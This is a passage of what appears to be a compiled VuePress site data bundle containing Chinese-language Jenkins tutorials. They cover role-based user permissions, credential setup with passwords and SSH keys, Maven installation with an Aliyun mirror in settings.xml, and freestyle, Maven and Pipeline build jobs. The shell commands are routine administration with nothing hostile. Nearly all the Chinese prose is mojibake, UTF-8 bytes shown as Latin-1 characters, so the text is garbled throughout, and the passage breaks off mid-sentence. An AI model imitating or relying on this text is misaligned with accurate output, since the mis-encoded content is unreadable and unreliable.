æ¯ä¸æ¬¾æµè¡çå¼æºæç»­éæï¼continuous integrationï¼å·¥å·ï¼å¹¿æ³ç¨äºé¡¹ç®å¼åï¼å·æèªå¨åæå»ºãæµè¯åé¨ç½²ç­åè½ãå®ç½ï¼ http://jenkins-ci.org/ã\n\njenkins çç¹å¾ï¼\n\n * å¼æºç java è¯­è¨å¼åæç»­éæå·¥å·ï¼æ¯ææç»­éæï¼æç»­é¨ç½²ã\n * æäºå®è£é¨ç½²éç½®ï¼å¯éè¿ yum å®è£ï¼æä¸è½½ war åä»¥åéè¿ docker å®¹å¨ç­å¿«éå®ç°å®è£é¨ç½²ï¼å¯æ¹ä¾¿ web çé¢éç½®ç®¡çã\n * æ¶æ¯éç¥åæµè¯æ¥åï¼éæ rss/e-mail éè¿ rss åå¸æå»ºç»ææå½æå»ºå®ææ¶éè¿ e-mail éç¥ï¼çæ junit/testng æµè¯æ¥åã\n * åå¸å¼æå»ºï¼æ¯æ jenkins è½å¤è®©å¤å°è®¡ç®æºä¸èµ·æå»º / æµè¯ã\n * æä»¶è¯å«ï¼jenkins è½å¤è·è¸ªåªæ¬¡æå»ºçæåªäº jarï¼åªæ¬¡æå»ºä½¿ç¨åªä¸ªçæ¬ç jar ç­ã\n * ä¸°å¯çæä»¶æ¯æï¼æ¯ææ©å±æä»¶ï¼ä½ å¯ä»¥å¼åéåèªå·±å¢éä½¿ç¨çå·¥å·ï¼å¦ gitï¼svnï¼mavenï¼docker ç­ã",charsets:{cjk:!0}},{title:"Jenkins(ä¸) Jenkinsç¨æ·ç®¡çåå­è¯",frontmatter:{title:"Jenkins(ä¸) Jenkinsç¨æ·ç®¡çåå­è¯",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/502",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/50.Jenkins/502.Jenkins(%E4%B8%89)%20Jenkins%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E5%8F%8A%E5%87%AD%E8%AF%81.html",relativePath:"01.è¿ç»´/50.Jenkins/502.Jenkins(ä¸) Jenkinsç¨æ·ç®¡çåå­è¯.md",key:"v-a5b32138",path:"/jenkins/502/",headers:[{level:2,title:"ç¨æ·ç®¡ç",slug:"ç¨æ·ç®¡ç",normalizedTitle:"ç¨æ·ç®¡ç",charIndex:2},{level:3,title:"å®è£Role-based Authorization Strategyæä»¶",slug:"å®è£role-based-authorization-strategyæä»¶",normalizedTitle:"å®è£ role-based authorization strategy æä»¶",charIndex:72},{level:3,title:"ä¿®æ¹å®å¨éç½®ç­ç¥",slug:"ä¿®æ¹å®å¨éç½®ç­ç¥",normalizedTitle:"ä¿®æ¹å®å¨éç½®ç­ç¥",charIndex:118},{level:3,title:"åéè§è²åç¨æ·",slug:"åéè§è²åç¨æ·",normalizedTitle:"åéè§è²åç¨æ·",charIndex:135},{level:3,title:"å»ºç«é¡¹ç®",slug:"å»ºç«é¡¹ç®",normalizedTitle:"å»ºç«é¡¹ç®",charIndex:696},{level:2,title:"Jenkinså­è¯ç®¡ç",slug:"jenkinså­è¯ç®¡ç",normalizedTitle:"jenkins å­è¯ç®¡ç",charIndex:713},{level:3,title:"å®è£Credentials Bindingæä»¶",slug:"å®è£credentials-bindingæä»¶",normalizedTitle:"å®è£ credentials binding æä»¶",charIndex:807},{level:3,title:"å®è£Gitæä»¶åGitå·¥å·",slug:"å®è£gitæä»¶ågitå·¥å·",normalizedTitle:"å®è£ git æä»¶å git å·¥å·",charIndex:1296},{level:3,title:"æ·»å å­è¯ï¼username & passwordï¼",slug:"æ·»å å­è¯-username-password",normalizedTitle:"æ·»å å­è¯ï¼username &amp; passwordï¼",charIndex:null},{level:3,title:"SSH å¯é¥ç±»å",slug:"ssh-å¯é¥ç±»å",normalizedTitle:"ssh å¯é¥ç±»å",charIndex:1680}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"ç¨æ·ç®¡ç å®è£Role-based Authorization Strategyæä»¶ ä¿®æ¹å®å¨éç½®ç­ç¥ åéè§è²åç¨æ· å»ºç«é¡¹ç® Jenkinså­è¯ç®¡ç å®è£Credentials Bindingæä»¶ å®è£Gitæä»¶åGitå·¥å· æ·»å å­è¯ï¼username & passwordï¼ SSH å¯é¥ç±»å",content:'# ç¨æ·ç®¡ç\n\næä»¬å¯ä»¥å©ç¨ Role-based Authorization Strategy æä»¶æ¥ç®¡ç Jenkins ç¨æ·æé\n\n\n# å®è£ Role-based Authorization Strategy æä»¶\n\n\n\n\n# ä¿®æ¹å®å¨éç½®ç­ç¥\n\n\n\n\n\n\n# åéè§è²åç¨æ·\n\n\n\n\n\n\n\nGlobal rolesï¼å¨å±è§è²ï¼ï¼ç®¡çåç­é«çº§ç¨æ·å¯ä»¥åå»ºåºäºå¨å±çè§è²\nItem rolesï¼é¡¹ç®è§è²ï¼ï¼éå¯¹æä¸ªæèæäºé¡¹ç®çè§è²\nNode rolesï¼èç¹è§è²ï¼ï¼èç¹ç¸å³çæé\n\næä»¬æ·»å ä»¥ä¸ä¸ä¸ªè§è²ï¼\n\n * baseRoleï¼è¯¥è§è²ä¸ºå¨å±è§è²ãè¿ä¸ªè§è²éè¦ç»å® Overall ä¸é¢ç Read æéï¼æ¯ä¸ºäºç»ææç¨æ·ç»å®æåºæ¬ç Jenkins è®¿é®æéãæ³¨æï¼å¦æä¸ç»åç»­ç¨æ·ç»å®è¿ä¸ªè§è²ï¼ä¼æ¥éè¯¯ï¼ç¨æ·å ismissing the Overall/Read permission\n * role1ï¼è¯¥è§è²ä¸ºé¡¹ç®è§è²ãä½¿ç¨æ­£åè¡¨è¾¾å¼ç»å® "itcast.*"ï¼æææ¯åªè½æä½ itcast å¼å¤´çé¡¹ç®ã\n * role2ï¼è¯¥è§è²ä¹ä¸ºé¡¹ç®è§è²ãç»å® "itheima.*"ï¼æææ¯åªè½æä½ itheima å¼å¤´çé¡¹ç®ã\n\n\n\n\n\n\n\n\n\nå¨ç³»ç»ç®¡çé¡µé¢è¿å¥ Manage Users\n\n\n\n\n\nç»ç¨æ·åéè§è²\nç³»ç»ç®¡çé¡µé¢è¿å¥ Manage and Assign Rolesï¼ç¹å» Assign Roles\nç»å®è§åå¦ä¸ï¼\nroot1 ç¨æ·åå«ç»å® baseRole å role1 è§è²\nroot2 ç¨æ·åå«ç»å® baseRole å role2 è§è²\n\n\n\n\n\n\n# å»ºç«é¡¹ç®\n\n\n\n\n\n\n\n\n\n\n# Jenkins å­è¯ç®¡ç\n\nå­æ®å¯ä»¥ç¨æ¥å­å¨éè¦å¯æä¿æ¤çæ°æ®åºå¯ç ãGitlab å¯ç ä¿¡æ¯ãDocker ç§æä»åºå¯ç ç­ï¼ä»¥ä¾¿ Jenkins å¯ä»¥åè¿äºç¬¬ä¸æ¹çåºç¨è¿è¡äº¤äºã\n\n\n# å®è£ Credentials Binding æä»¶\n\nè¦å¨ Jenkins ä½¿ç¨å­è¯ç®¡çåè½ï¼éè¦å®è£ Credentials Binding æä»¶\n\n\n\n\n\n\n\n\n\n\n\n * Username with passwordï¼ç¨æ·ååå¯ç \n * SSH Username with private keyï¼ ä½¿ç¨ SSH ç¨æ·åå¯é¥\n * Secret fileï¼éè¦ä¿å¯çææ¬æä»¶ï¼ä½¿ç¨æ¶ Jenkins ä¼å°æä»¶å¤å¶å°ä¸ä¸ªä¸´æ¶ç®å½ä¸­ï¼åå°æä»¶è·¯å¾è®¾ç½®å°ä¸ä¸ªåéä¸­ï¼ç­æå»ºç»æåï¼æå¤å¶ç Secret file å°±ä¼è¢«å é¤ã\n * Secret textï¼éè¦ä¿å­çä¸ä¸ªå å¯çææ¬ä¸²ï¼å¦ééæºå¨äººæ Github ç api token\n * Certificateï¼éè¿ä¸ä¼ è¯ä¹¦æä»¶çæ¹å¼\n\nå¸¸ç¨çå­è¯ç±»åæï¼Username with passwordï¼ç¨æ·å¯ç ï¼å SSH Username with private keyï¼SSH å¯é¥ï¼ï¼æ¥ä¸æ¥ä»¥ä½¿ç¨ Git å·¥å·å° Gitlab æåé¡¹ç®æºç ä¸ºä¾ï¼æ¼ç¤º Jenkins çå¦ä½ç®¡ç Gitlab çå­è¯ã\n\n\n# å®è£ Git æä»¶å Git å·¥å·\n\nä¸ºäºè®© Jenkins æ¯æä» Gitlab æåæºç ï¼éè¦å®è£ Git æä»¶ä»¥åå¨ CentOS7 ä¸å®è£ Git å·¥å·ã\n\n\n\nå¨ centos ä¸å®è£ git å·¥å·\n\n# å®è£\nyum install git -y \n# å®è£åæ¥ççæ¬\ngit --version \n\n\n1\n2\n3\n4\n\n\n\n# æ·»å å­è¯ï¼username & passwordï¼\n\næä½ å¨ git ä¸çè´¦å·å¯ç å å¥å°å­è¯ä¸­ã\n\n\n\nåå°æä»¬å¨ jenkins çé¡¹ç®ä¸­ï¼æ¥éç½®è¿ä¸ªé¡¹ç®ã\n\n\n\n\n\nåºç¨ï¼ç¶åä¿å­ãä¿å­åæä»¬æå»ºè¿ä¸ªé¡¹ç®\n\n\n\n\n\næå»ºæååï¼å¯ä»¥çå° jenkins ä¼æé¡¹ç®å¨æå¡å¨ä¸­ç /var/lib/jenkins/workspace/test01 è·¯å¾æå»ºä¸ä¸ªé¡¹ç®ï¼éè¿è¿ç§æ¹å¼ä»£è¡¨æä»¬éç½® git çå­è¯æ¯æåçã\n\n\n# SSH å¯é¥ç±»å\n\nSSH åå¯ç»å½ç¤ºæå¾\n\n\n\n1. ä½¿ç¨ root ç¨æ·çæå¬é¥åç§é¥\n\nssh-keygen -t rsa\n\n\n1\n\n\nå¨ /root/.ssh/ ç®å½ä¿å­äºå¬é¥åä½¿ç¨\n\n\n\nid_rsaï¼ç§é¥æä»¶\nid_rsa.pubï¼å¬é¥æä»¶\n\n2. æçæçå¬é¥çåå®¹æ¾å¨ Gitlab ä¸­ï¼æçæ¯ Gitea\n\n\n\n3. å¨ Jenkins ä¸­æ·»å å­è¯ï¼éç½®ç§é¥\nå¨ Jenkins æ·»å ä¸ä¸ªæ°çå­è¯ï¼ç±»åä¸º "SSH Username with private key"ï¼æåæçæç§ææä»¶åå®¹å¤å¶è¿æ¥\n\n\n\nè¿ä¸ª rootï¼æ¯ä½ å¨ æå¡å¨ï¼root ç®å½ä¸çæçï¼æä»¥å¡«å rootï¼æåä¾ç¶æ¯å¨é¡¹ç®ä¸­éç½®ä¸ä¸ git å³å¯',normalizedContent:'# ç¨æ·ç®¡ç\n\næä»¬å¯ä»¥å©ç¨ role-based authorization strategy æä»¶æ¥ç®¡ç jenkins ç¨æ·æé\n\n\n# å®è£ role-based authorization strategy æä»¶\n\n\n\n\n# ä¿®æ¹å®å¨éç½®ç­ç¥\n\n\n\n\n\n\n# åéè§è²åç¨æ·\n\n\n\n\n\n\n\nglobal rolesï¼å¨å±è§è²ï¼ï¼ç®¡çåç­é«çº§ç¨æ·å¯ä»¥åå»ºåºäºå¨å±çè§è²\nitem rolesï¼é¡¹ç®è§è²ï¼ï¼éå¯¹æä¸ªæèæäºé¡¹ç®çè§è²\nnode rolesï¼èç¹è§è²ï¼ï¼èç¹ç¸å³çæé\n\næä»¬æ·»å ä»¥ä¸ä¸ä¸ªè§è²ï¼\n\n * baseroleï¼è¯¥è§è²ä¸ºå¨å±è§è²ãè¿ä¸ªè§è²éè¦ç»å® overall ä¸é¢ç read æéï¼æ¯ä¸ºäºç»ææç¨æ·ç»å®æåºæ¬ç jenkins è®¿é®æéãæ³¨æï¼å¦æä¸ç»åç»­ç¨æ·ç»å®è¿ä¸ªè§è²ï¼ä¼æ¥éè¯¯ï¼ç¨æ·å ismissing the overall/read permission\n * role1ï¼è¯¥è§è²ä¸ºé¡¹ç®è§è²ãä½¿ç¨æ­£åè¡¨è¾¾å¼ç»å® "itcast.*"ï¼æææ¯åªè½æä½ itcast å¼å¤´çé¡¹ç®ã\n * role2ï¼è¯¥è§è²ä¹ä¸ºé¡¹ç®è§è²ãç»å® "itheima.*"ï¼æææ¯åªè½æä½ itheima å¼å¤´çé¡¹ç®ã\n\n\n\n\n\n\n\n\n\nå¨ç³»ç»ç®¡çé¡µé¢è¿å¥ manage users\n\n\n\n\n\nç»ç¨æ·åéè§è²\nç³»ç»ç®¡çé¡µé¢è¿å¥ manage and assign rolesï¼ç¹å» assign roles\nç»å®è§åå¦ä¸ï¼\nroot1 ç¨æ·åå«ç»å® baserole å role1 è§è²\nroot2 ç¨æ·åå«ç»å® baserole å role2 è§è²\n\n\n\n\n\n\n# å»ºç«é¡¹ç®\n\n\n\n\n\n\n\n\n\n\n# jenkins å­è¯ç®¡ç\n\nå­æ®å¯ä»¥ç¨æ¥å­å¨éè¦å¯æä¿æ¤çæ°æ®åºå¯ç ãgitlab å¯ç ä¿¡æ¯ãdocker ç§æä»åºå¯ç ç­ï¼ä»¥ä¾¿ jenkins å¯ä»¥åè¿äºç¬¬ä¸æ¹çåºç¨è¿è¡äº¤äºã\n\n\n# å®è£ credentials binding æä»¶\n\nè¦å¨ jenkins ä½¿ç¨å­è¯ç®¡çåè½ï¼éè¦å®è£ credentials binding æä»¶\n\n\n\n\n\n\n\n\n\n\n\n * username with passwordï¼ç¨æ·ååå¯ç \n * ssh username with private keyï¼ ä½¿ç¨ ssh ç¨æ·åå¯é¥\n * secret fileï¼éè¦ä¿å¯çææ¬æä»¶ï¼ä½¿ç¨æ¶ jenkins ä¼å°æä»¶å¤å¶å°ä¸ä¸ªä¸´æ¶ç®å½ä¸­ï¼åå°æä»¶è·¯å¾è®¾ç½®å°ä¸ä¸ªåéä¸­ï¼ç­æå»ºç»æåï¼æå¤å¶ç secret file å°±ä¼è¢«å é¤ã\n * secret textï¼éè¦ä¿å­çä¸ä¸ªå å¯çææ¬ä¸²ï¼å¦ééæºå¨äººæ github ç api token\n * certificateï¼éè¿ä¸ä¼ è¯ä¹¦æä»¶çæ¹å¼\n\nå¸¸ç¨çå­è¯ç±»åæï¼username with passwordï¼ç¨æ·å¯ç ï¼å ssh username with private keyï¼ssh å¯é¥ï¼ï¼æ¥ä¸æ¥ä»¥ä½¿ç¨ git å·¥å·å° gitlab æåé¡¹ç®æºç ä¸ºä¾ï¼æ¼ç¤º jenkins çå¦ä½ç®¡ç gitlab çå­è¯ã\n\n\n# å®è£ git æä»¶å git å·¥å·\n\nä¸ºäºè®© jenkins æ¯æä» gitlab æåæºç ï¼éè¦å®è£ git æä»¶ä»¥åå¨ centos7 ä¸å®è£ git å·¥å·ã\n\n\n\nå¨ centos ä¸å®è£ git å·¥å·\n\n# å®è£\nyum install git -y \n# å®è£åæ¥ççæ¬\ngit --version \n\n\n1\n2\n3\n4\n\n\n\n# æ·»å å­è¯ï¼username & passwordï¼\n\næä½ å¨ git ä¸çè´¦å·å¯ç å å¥å°å­è¯ä¸­ã\n\n\n\nåå°æä»¬å¨ jenkins çé¡¹ç®ä¸­ï¼æ¥éç½®è¿ä¸ªé¡¹ç®ã\n\n\n\n\n\nåºç¨ï¼ç¶åä¿å­ãä¿å­åæä»¬æå»ºè¿ä¸ªé¡¹ç®\n\n\n\n\n\næå»ºæååï¼å¯ä»¥çå° jenkins ä¼æé¡¹ç®å¨æå¡å¨ä¸­ç /var/lib/jenkins/workspace/test01 è·¯å¾æå»ºä¸ä¸ªé¡¹ç®ï¼éè¿è¿ç§æ¹å¼ä»£è¡¨æä»¬éç½® git çå­è¯æ¯æåçã\n\n\n# ssh å¯é¥ç±»å\n\nssh åå¯ç»å½ç¤ºæå¾\n\n\n\n1. ä½¿ç¨ root ç¨æ·çæå¬é¥åç§é¥\n\nssh-keygen -t rsa\n\n\n1\n\n\nå¨ /root/.ssh/ ç®å½ä¿å­äºå¬é¥åä½¿ç¨\n\n\n\nid_rsaï¼ç§é¥æä»¶\nid_rsa.pubï¼å¬é¥æä»¶\n\n2. æçæçå¬é¥çåå®¹æ¾å¨ gitlab ä¸­ï¼æçæ¯ gitea\n\n\n\n3. å¨ jenkins ä¸­æ·»å å­è¯ï¼éç½®ç§é¥\nå¨ jenkins æ·»å ä¸ä¸ªæ°çå­è¯ï¼ç±»åä¸º "ssh username with private key"ï¼æåæçæç§ææä»¶åå®¹å¤å¶è¿æ¥\n\n\n\nè¿ä¸ª rootï¼æ¯ä½ å¨ æå¡å¨ï¼root ç®å½ä¸çæçï¼æä»¥å¡«å rootï¼æåä¾ç¶æ¯å¨é¡¹ç®ä¸­éç½®ä¸ä¸ git å³å¯',charsets:{cjk:!0}},{title:"Jenkins(å) Mavenå®è£åéç½®",frontmatter:{title:"Jenkins(å) Mavenå®è£åéç½®",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/503",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/50.Jenkins/503.Jenkins(%E5%9B%9B)%20Maven%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE.html",relativePath:"01.è¿ç»´/50.Jenkins/503.Jenkins(å) Mavenå®è£åéç½®.md",key:"v-45042106",path:"/jenkins/503/",headers:[{level:2,title:"å®è£Maven",slug:"å®è£maven",normalizedTitle:"å®è£ maven",charIndex:21},{level:3,title:"éç½®ç¯å¢åé",slug:"éç½®ç¯å¢åé",normalizedTitle:"éç½®ç¯å¢åé",charIndex:181},{level:3,title:"å¨å±å·¥å·éç½®å³èJDKåMaven",slug:"å¨å±å·¥å·éç½®å³èjdkåmaven",normalizedTitle:"å¨å±å·¥å·éç½®å³è jdk å maven",charIndex:405},{level:3,title:"æ·»å Jenkinså¨å±åé",slug:"æ·»å jenkinså¨å±åé",normalizedTitle:"æ·»å  jenkins å¨å±åé",charIndex:492},{level:3,title:"ä¿®æ¹Mavençsettings.xml",slug:"ä¿®æ¹mavençsettings-xml",normalizedTitle:"ä¿®æ¹ maven ç settings.xml",charIndex:516},{level:3,title:"æµè¯Mavenæ¯å¦éç½®æå",slug:"æµè¯mavenæ¯å¦éç½®æå",normalizedTitle:"æµè¯ maven æ¯å¦éç½®æå",charIndex:887}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"å®è£Maven éç½®ç¯å¢åé å¨å±å·¥å·éç½®å³èJDKåMaven æ·»å Jenkinså¨å±åé ä¿®æ¹Mavençsettings.xml æµè¯Mavenæ¯å¦éç½®æå",content:"å¨ Jenkins éææå¡å¨ä¸ï¼æä»¬éè¦å®è£ Maven æ¥ç¼è¯åæåé¡¹ç®ã\n\n\n# å®è£ Maven\n\nåä¸ä¼  Maven è½¯ä»¶å°æå¡å¨\n\n# è§£å\ntar -xzf apache-maven-3.6.2-bin.tar.gz \n# ç§»å¨æä»¶\nmv apache-maven-3.6.2 /opt/software/maven\n\n\n1\n2\n3\n4\n\n\n\n# éç½®ç¯å¢åé\n\nvim /etc/profile\nexport JAVA_HOME=/opt/software/java8\nexport MAVEN_HOME=/opt/software/maven\nexport PATH=$PATH:$JAVA_HOME/bin:$MAVEN_HOME/bin\n\n\n1\n2\n3\n4\n\n\n# éç½®çæ\nsource /etc/profile \n# æ¥æ¾Mavençæ¬\nmvn -v \n\n\n1\n2\n3\n4\n\n\n\n# å¨å±å·¥å·éç½®å³è JDK å Maven\n\nJenkins->Global Tool Configuration->JDK-> æ°å¢ JDKï¼éç½®å¦ä¸ï¼\n\n\n\n\n\n\n\n\n# æ·»å  Jenkins å¨å±åé\n\n\n\n\n\n\n# ä¿®æ¹ Maven ç settings.xml\n\n# åå»ºæ¬å°ä»åºç®å½\nmkdir /opt/software/maven/repo \n# ä¿®æ¹æä»¶åå®¹\nvi /opt/software/maven/conf/settings.xml\n<localRepository>/opt/software/maven/repo</localRepository>\n<mirror>\n\t<id>alimaven</id>\n\t<name>aliyun maven</name>\n\t<url>https://maven.aliyun.com/nexus/content/groups/public/</url>\n\t<mirrorOf>central</mirrorOf>\n</mirror> \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# æµè¯ Maven æ¯å¦éç½®æå\n\nä½¿ç¨ä¹åç gitlab å¯ç æµè¯é¡¹ç®ï¼ä¿®æ¹ jenkins é¡¹ç®éç½®\n\n\n\n\n\n\n\n\n\næä»¬å° jenkins æå¡å¨ç /var/lib/jenkins/workspace/test01/target/ ä¸é¢å°±å¯ä»¥çå°æä»¬æç jar å\n\n> è¿éåé¦ä¸ä¸ªé®é¢ï¼æè¿éä½¿ç¨çæ¯ maven ç§æï¼nexusï¼ï¼maven éç½®æåä½é¡¹ç®å°±æ¯æ²¡åæ³æåå°èªå·±åå¸ç jarï¼åå æ¯æä¸è½½çæ¯ maven3.8.xï¼æ¢æ 3.6 å°±å¯ä»¥äºï¼çå°åå è¯´æ¯å ä¸º 3.8.x æ°å äº jar çå®å¨é»å¡é®é¢ã",normalizedContent:"å¨ jenkins éææå¡å¨ä¸ï¼æä»¬éè¦å®è£ maven æ¥ç¼è¯åæåé¡¹ç®ã\n\n\n# å®è£ maven\n\nåä¸ä¼  maven è½¯ä»¶å°æå¡å¨\n\n# è§£å\ntar -xzf apache-maven-3.6.2-bin.tar.gz \n# ç§»å¨æä»¶\nmv apache-maven-3.6.2 /opt/software/maven\n\n\n1\n2\n3\n4\n\n\n\n# éç½®ç¯å¢åé\n\nvim /etc/profile\nexport java_home=/opt/software/java8\nexport maven_home=/opt/software/maven\nexport path=$path:$java_home/bin:$maven_home/bin\n\n\n1\n2\n3\n4\n\n\n# éç½®çæ\nsource /etc/profile \n# æ¥æ¾mavençæ¬\nmvn -v \n\n\n1\n2\n3\n4\n\n\n\n# å¨å±å·¥å·éç½®å³è jdk å maven\n\njenkins->global tool configuration->jdk-> æ°å¢ jdkï¼éç½®å¦ä¸ï¼\n\n\n\n\n\n\n\n\n# æ·»å  jenkins å¨å±åé\n\n\n\n\n\n\n# ä¿®æ¹ maven ç settings.xml\n\n# åå»ºæ¬å°ä»åºç®å½\nmkdir /opt/software/maven/repo \n# ä¿®æ¹æä»¶åå®¹\nvi /opt/software/maven/conf/settings.xml\n<localrepository>/opt/software/maven/repo</localrepository>\n<mirror>\n\t<id>alimaven</id>\n\t<name>aliyun maven</name>\n\t<url>https://maven.aliyun.com/nexus/content/groups/public/</url>\n\t<mirrorof>central</mirrorof>\n</mirror> \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# æµè¯ maven æ¯å¦éç½®æå\n\nä½¿ç¨ä¹åç gitlab å¯ç æµè¯é¡¹ç®ï¼ä¿®æ¹ jenkins é¡¹ç®éç½®\n\n\n\n\n\n\n\n\n\næä»¬å° jenkins æå¡å¨ç /var/lib/jenkins/workspace/test01/target/ ä¸é¢å°±å¯ä»¥çå°æä»¬æç jar å\n\n> è¿éåé¦ä¸ä¸ªé®é¢ï¼æè¿éä½¿ç¨çæ¯ maven ç§æï¼nexusï¼ï¼maven éç½®æåä½é¡¹ç®å°±æ¯æ²¡åæ³æåå°èªå·±åå¸ç jarï¼åå æ¯æä¸è½½çæ¯ maven3.8.xï¼æ¢æ 3.6 å°±å¯ä»¥äºï¼çå°åå è¯´æ¯å ä¸º 3.8.x æ°å äº jar çå®å¨é»å¡é®é¢ã",charsets:{cjk:!0}},{title:"Jenkins(äº) Jenkinsæå»ºMavené¡¹ç®",frontmatter:{title:"Jenkins(äº) Jenkinsæå»ºMavené¡¹ç®",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/504",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/50.Jenkins/504.Jenkins(%E4%BA%94)%20Jenkins%E6%9E%84%E5%BB%BAMaven%E9%A1%B9%E7%9B%AE.html",relativePath:"01.è¿ç»´/50.Jenkins/504.Jenkins(äº) Jenkinsæå»ºMavené¡¹ç®.md",key:"v-eebfe876",path:"/jenkins/504/",headers:[{level:2,title:"èªç±é£æ ¼é¡¹ç®æå»º",slug:"èªç±é£æ ¼é¡¹ç®æå»º",normalizedTitle:"èªç±é£æ ¼é¡¹ç®æå»º",charIndex:269},{level:2,title:"maven é¡¹ç®",slug:"maven-é¡¹ç®",normalizedTitle:"maven é¡¹ç®",charIndex:585},{level:2,title:"Pipelineæµæ°´çº¿é¡¹ç®æå»º",slug:"pipelineæµæ°´çº¿é¡¹ç®æå»º",normalizedTitle:"pipeline æµæ°´çº¿é¡¹ç®æå»º",charIndex:647},{level:3,title:"Pipelineç®ä»",slug:"pipelineç®ä»",normalizedTitle:"pipeline ç®ä»",charIndex:668},{level:3,title:"å®è£Pipelineæä»¶",slug:"å®è£pipelineæä»¶",normalizedTitle:"å®è£ pipeline æä»¶",charIndex:1498},{level:3,title:"Scripted Pipelineèæ¬å¼-Pipeline",slug:"scripted-pipelineèæ¬å¼-pipeline",normalizedTitle:"scripted pipeline èæ¬å¼ - pipeline",charIndex:2265},{level:2,title:"ç¼è¯æåé¨ç½²",slug:"ç¼è¯æåé¨ç½²",normalizedTitle:"ç¼è¯æåé¨ç½²",charIndex:2844},{level:3,title:"æåä»£ç ",slug:"æåä»£ç ",normalizedTitle:"æåä»£ç ",charIndex:1766},{level:3,title:"ç¼è¯æå",slug:"ç¼è¯æå",normalizedTitle:"ç¼è¯æå",charIndex:323},{level:3,title:"è¿ç¨é¨ç½²",slug:"è¿ç¨é¨ç½²",normalizedTitle:"è¿ç¨é¨ç½²",charIndex:2942},{level:2,title:"æjenkinsçPipelineèæ¬æ¾å°é¡¹ç®ä¸­æ§è¡ï¼Pipeline Script from SCMï¼",slug:"æjenkinsçpipelineèæ¬æ¾å°é¡¹ç®ä¸­æ§è¡-pipeline-script-from-scm",normalizedTitle:"æ jenkins ç pipeline èæ¬æ¾å°é¡¹ç®ä¸­æ§è¡ï¼pipeline script from scmï¼",charIndex:3005}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"èªç±é£æ ¼é¡¹ç®æå»º maven é¡¹ç® Pipelineæµæ°´çº¿é¡¹ç®æå»º Pipelineç®ä» å®è£Pipelineæä»¶ Scripted Pipelineèæ¬å¼-Pipeline ç¼è¯æåé¨ç½² æåä»£ç  ç¼è¯æå è¿ç¨é¨ç½² æjenkinsçPipelineèæ¬æ¾å°é¡¹ç®ä¸­æ§è¡ï¼Pipeline Script from SCMï¼",content:"Jenkins ä¸­èªå¨æå»ºé¡¹ç®çç±»åæå¾å¤ï¼å¸¸ç¨çæä»¥ä¸ä¸ç§ï¼\n\n * èªç±é£æ ¼è½¯ä»¶é¡¹ç®ï¼FreeStyle Projectï¼å¯ä»¥æå»ºä¸åè¯­è¨çé¡¹ç®\n * Maven é¡¹ç®ï¼Maven Projectï¼ä¸é¨åå¯¹ java è¯­è¨é¡¹ç®\n * æµæ°´çº¿é¡¹ç®ï¼Pipeline Projectï¼çµæ´»åº¦é«ï¼ç¨ä»£ç ç¼å jenkins æå»ºè¿ç¨ï¼å¦ k8s\n\næ¯ç§ç±»åçæå»ºå¶å®é½å¯ä»¥å®æä¸æ ·çæå»ºè¿ç¨ä¸ç»æï¼åªæ¯å¨æä½æ¹å¼ãçµæ´»åº¦ç­æ¹é¢ææåºå«ï¼å¨å®éå¼åä¸­å¯ä»¥æ ¹æ®èªå·±çéæ±åä¹ æ¯æ¥éæ©ãï¼PSï¼ä¸ªäººæ¨èä½¿ç¨æµæ°´çº¿ç±»åï¼å ä¸ºçµæ´»åº¦éå¸¸é«ï¼\n\n\n# èªç±é£æ ¼é¡¹ç®æå»º\n\n1. åå»ºèªç±é£æ ¼é¡¹ç®\n\n\n\n\n\n2. éç½® git\n\n\n\n3. æå»º\n\n\n\n\n\n4. ç¼è¯æå\n\necho \"å¼å§ç¼è¯åæå\"\nmvn clean package\necho \"ç¼è¯åæåç»æ\"\n\n\n1\n2\n3\n\n\n\n\n\n\n\n\n5. é¨ç½²å°ç®æ æº\nå®è£ Deploy to container æä»¶ï¼è¿ç§æä»¶éååå¸ war è¿ç§ç±»åçé¡¹ç®ï¼å° tomcat ç­å®¹å¨ä¸å»ã\n\n\n\n\n\n\n\n\n\ntomcat å­è¯éè¦èªå·±ç¾åº¦å»éç½®ä»¥ä¸ï¼å½ä½ éç½®æååï¼å¯ä»¥è®¿é®å° tomcat ç IP:8080/manager/html é¡µé¢ï¼éç½®å®ååå° jenkinsï¼é¨ç½²è¿ç¨ tomcat çæ¶åéè¦è¿ä¸ªå­è¯ã\n\n\n# maven é¡¹ç®\n\n1. å®è£ Maven Integration æä»¶\n2. æå»º maven é¡¹ç®\n\n\n\n\n\n\n\n\n# Pipeline æµæ°´çº¿é¡¹ç®æå»º\n\n\n# Pipeline ç®ä»\n\nPipelineï¼ç®åæ¥è¯´ï¼å°±æ¯ä¸å¥è¿è¡å¨ Jenkins ä¸çå·¥ä½æµæ¡æ¶ï¼å°åæ¥ç¬ç«è¿è¡äºåä¸ªæèå¤ä¸ªèç¹çä»»å¡è¿æ¥èµ·æ¥ï¼å®ç°åä¸ªä»»å¡é¾ä»¥å®æçå¤ææµç¨ç¼æåå¯è§åçå·¥ä½ã\n\nä½¿ç¨ Pipeline æä»¥ä¸å¥½å¤ï¼\n\n * ä»£ç ï¼Pipeline ä»¥ä»£ç çå½¢å¼å®ç°ï¼éå¸¸è¢«æ£å¥æºä»£ç æ§å¶ï¼ä½¿å¢éè½å¤ç¼è¾ï¼å®¡æ¥åè¿­ä»£å¶ä¼ éæµç¨ã\n * æä¹ï¼æ è®ºæ¯è®¡ååçè¿æ¯è®¡åå¤çæå¡å¨éå¯ï¼Pipeline é½æ¯å¯æ¢å¤çã\n * å¯åæ­¢ï¼Pipeline å¯æ¥æ¶äº¤äºå¼è¾å¥ï¼ä»¥ç¡®å®æ¯å¦ç»§ç»­æ§è¡ 